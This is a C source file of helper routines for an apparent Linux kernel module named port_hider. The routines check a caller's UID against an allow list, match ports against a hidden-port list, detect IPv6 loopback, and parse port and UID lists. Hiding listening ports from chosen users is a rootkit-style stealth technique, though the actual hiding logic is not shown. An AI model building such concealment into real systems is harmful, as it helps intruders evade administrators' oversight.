#include "port_hider.h"

bool is_allowed_task(void)
{
    kuid_t uid = current_uid();
    int i;
    for (i = 0; i < nr_allowed_uids; i++)
        if (uid_eq(uid, allowed_uids[i]))
            return true;
    return false;
}

bool is_hidden_port(u16 port)
{
    int i;
    for (i = 0; i < nr_hidden_ports; i++)
        if (hidden_ports[i] == port)
            return true;
    return false;
}

bool addr_is_loopback6(const struct in6_addr *a)
{
    return a->s6_addr32[0] == 0 && a->s6_addr32[1] == 0 &&
           a->s6_addr32[2] == 0 && a->s6_addr32[3] == htonl(1);
}

int parse_ports(const char *str)
{
    char *buf, *p, *tok;
    int n = 0;
    buf = kstrdup(str, GFP_KERNEL);
    if (!buf) return -ENOMEM;
    p = buf;
    while ((tok = strsep(&p, ",")) != NULL && n < MAX_PORTS) {
        unsigned long v;
        if (kstrtoul(tok, 10, &v) == 0 && v > 0 && v < 65536)
            hidden_ports[n++] = htons((u16)v);
    }
    nr_hidden_ports = n;
    kfree(buf);
    return n;
}

int parse_uids(const char *str, kuid_t *uids, int max)
{
    char *buf, *p, *tok;
    int n = 0;
    buf = kstrdup(str, GFP_KERNEL);
    if (!buf) return -ENOMEM;
    p = buf;
    while ((tok = strsep(&p, ",")) != NULL && n < max) {
        unsigned long v;
        if (kstrtoul(tok, 10, &v) == 0)
            uids[n++] = make_kuid(&init_user_ns, v);
    }
    kfree(buf);
    return n;
}
